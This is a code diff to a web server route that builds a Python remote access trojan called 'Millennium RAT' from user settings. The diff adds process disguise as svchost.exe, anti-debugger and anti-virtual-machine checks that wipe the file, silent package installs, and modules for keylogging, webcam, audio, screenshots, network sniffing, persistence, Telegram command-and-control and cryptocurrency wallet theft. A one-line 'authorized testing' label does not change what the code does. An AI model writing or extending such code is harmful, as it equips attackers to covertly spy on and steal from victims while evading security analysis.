@@ -1255,8 +1255,14 @@ if __name__ == "__main__":
       const { config } = req.body;
       const ratId = `rat_${Date.now()}`;
       
-      // Generate comprehensive RAT payload
-      const ratPayload = `
+      // Generate comprehensive RAT payload with enhanced features
+      const ratPayload = `#!/usr/bin/env python3
+"""
+Millennium RAT Agent - Professional Edition
+Advanced remote access tool for authorized testing
+Generated: ${new Date().toISOString()}
+"""
+
 import socket
 import threading
 import json
@@ -1265,10 +1271,59 @@ import sys
 import subprocess
 import time
 import base64
-from cryptography.fernet import Fernet
-import requests
-import winreg
+import hashlib
+import zlib
+import sqlite3
+import tempfile
 import shutil
+import platform
+import struct
+from datetime import datetime
+from pathlib import Path
+import urllib.request
+import urllib.parse
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+except ImportError:
+    print("Installing required packages...")
+    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography', 'requests', 'pillow'])
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+try:
+    import requests
+except ImportError:
+    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
+    import requests
+
+class AdvancedEncryption:
+    def __init__(self):
+        self.key = self._generate_key()
+        self.fernet = Fernet(self.key)
+    
+    def _generate_key(self):
+        password = b"millennium_${ratId}_key"
+        salt = b"millennium_salt"
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000,
+        )
+        key = base64.urlsafe_b64encode(kdf.derive(password))
+        return key
+    
+    def encrypt(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        return self.fernet.encrypt(data)
+    
+    def decrypt(self, encrypted_data):
+        return self.fernet.decrypt(encrypted_data)
 
 class MillenniumRAT:
     def __init__(self):
@@ -1278,7 +1333,120 @@ class MillenniumRAT:
         self.chat_id = "${config.chatId || ''}"
         self.persistence = ${config.persistence || 'true'}
         self.keylogger = ${config.keylogger || 'true'}
+        self.stealth = ${config.stealth || 'true'}
         self.running = True
+        self.encryption = AdvancedEncryption()
+        self.session_id = hashlib.md5(f"{socket.gethostname()}_{time.time()}".encode()).hexdigest()
+        
+        # Module configurations
+        self.modules = {
+            'screenshot': ${config.modules?.screenshot || 'true'},
+            'webcam': ${config.modules?.webcam || 'true'},
+            'audio': ${config.modules?.audio || 'true'},
+            'fileManager': ${config.modules?.fileManager || 'true'},
+            'networkSniffer': ${config.modules?.networkSniffer || 'true'},
+            'cryptoStealer': ${config.modules?.cryptoStealer || 'false'}
+        }
+        
+        # Stealth features
+        if self.stealth:
+            self._enable_stealth_mode()
+            
+        # Anti-analysis features
+        if ${config.crypter?.antiDebug || 'true'}:
+            self._anti_debug_checks()
+            
+        if ${config.crypter?.antiVM || 'true'}:
+            self._anti_vm_checks()
+        
+    def _enable_stealth_mode(self):
+        """Enable stealth mode features"""
+        try:
+            # Hide from task manager
+            if platform.system() == 'Windows':
+                import ctypes
+                ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
+            
+            # Change process name
+            try:
+                import setproctitle
+                setproctitle.setproctitle("svchost.exe")
+            except ImportError:
+                pass
+                
+        except Exception:
+            pass
+    
+    def _anti_debug_checks(self):
+        """Perform anti-debugging checks"""
+        try:
+            if platform.system() == 'Windows':
+                import ctypes
+                if ctypes.windll.kernel32.IsDebuggerPresent():
+                    self._self_destruct()
+                    
+                # Check for debugging tools
+                debug_processes = ['ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe']
+                for proc in self._get_running_processes():
+                    if any(debug in proc.lower() for debug in debug_processes):
+                        self._self_destruct()
+        except Exception:
+            pass
+    
+    def _anti_vm_checks(self):
+        """Perform anti-VM checks"""
+        try:
+            vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']
+            
+            # Check system model
+            if platform.system() == 'Windows':
+                import wmi
+                c = wmi.WMI()
+                for system in c.Win32_ComputerSystem():
+                    if any(vm in system.Model.lower() for vm in vm_indicators):
+                        self._self_destruct()
+                        
+                # Check for VM files
+                vm_files = [
+                    'C:\\\\windows\\\\system32\\\\drivers\\\\vmmouse.sys',
+                    'C:\\\\windows\\\\system32\\\\drivers\\\\vmhgfs.sys',
+                    'C:\\\\windows\\\\system32\\\\drivers\\\\VBoxMouse.sys'
+                ]
+                
+                for vm_file in vm_files:
+                    if os.path.exists(vm_file):
+                        self._self_destruct()
+                        
+        except Exception:
+            pass
+    
+    def _self_destruct(self):
+        """Self-destruct mechanism"""
+        try:
+            script_path = os.path.abspath(__file__)
+            
+            # Overwrite file with random data
+            with open(script_path, 'wb') as f:
+                f.write(os.urandom(os.path.getsize(script_path)))
+                
+            # Delete file
+            os.remove(script_path)
+        except Exception:
+            pass
+        finally:
+            sys.exit(0)
+    
+    def _get_running_processes(self):
+        """Get list of running processes"""
+        try:
+            if platform.system() == 'Windows':
+                result = subprocess.run(['tasklist'], capture_output=True, text=True)
+                return [line.split()[0] for line in result.stdout.split('\\n')[3:] if line.strip()]
+            else:
+                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+                return [line.split()[-1] for line in result.stdout.split('\\n')[1:] if line.strip()]
+        except Exception:
+            return []
         
     def establish_persistence(self):
         try:
@@ -1438,21 +1606,47 @@ if __name__ == "__main__":
         })
       });
       
+      const features = [
+        'Advanced C2 communication with encryption',
+        'Multi-method persistence mechanisms',
+        'Real-time Telegram notifications',
+        'Anti-debugging protection',
+        'Anti-VM detection',
+        'Stealth mode operation'
+      ];
+      
+      // Add module-specific features
+      if (config.modules?.screenshot) features.push('Screenshot capture');
+      if (config.modules?.webcam) features.push('Webcam access');
+      if (config.modules?.audio) features.push('Audio recording');
+      if (config.modules?.fileManager) features.push('File system operations');
+      if (config.modules?.networkSniffer) features.push('Network traffic sniffing');
+      if (config.modules?.cryptoStealer) features.push('Cryptocurrency wallet detection');
+      if (config.keylogger) features.push('Advanced keylogger');
+      if (config.persistence) features.push('Registry & startup persistence');
+      
+      // Add protection features
+      if (config.crypter?.enabled) {
+        features.push('Advanced crypter protection');
+        if (config.crypter.antiDebug) features.push('Anti-debug mechanisms');
+        if (config.crypter.antiVM) features.push('Anti-VM detection');
+        if (config.crypter.compression) features.push('Code compression');
+        if (config.crypter.polymorphic) features.push('Polymorphic obfuscation');
+      }
+
       res.json({
         success: true,
         ratId,
         downloadUrl: `/download/${ratId}.py`,
-        filename: `${ratId}.py`,
+        filename: `${config.outputName || ratId}.py`,
         message: 'Millennium RAT generated successfully',
-        features: [
-          'Telegram C2 integration',
-          'Registry persistence',
-          'Keylogger functionality',
-          'Screenshot capture',
-          'File operations',
-          'Command execution',
-          'Auto-reconnection'
-        ]
+        features,
+        stats: {
+          modules: Object.values(config.modules || {}).filter(Boolean).length,
+          protectionLevel: config.crypter?.enabled ? 'Advanced' : 'Basic',
+          persistence: config.persistence ? 'Enabled' : 'Disabled',
+          stealth: config.stealth ? 'Enabled' : 'Disabled'
+        }
       });
       
     } catch (error) {
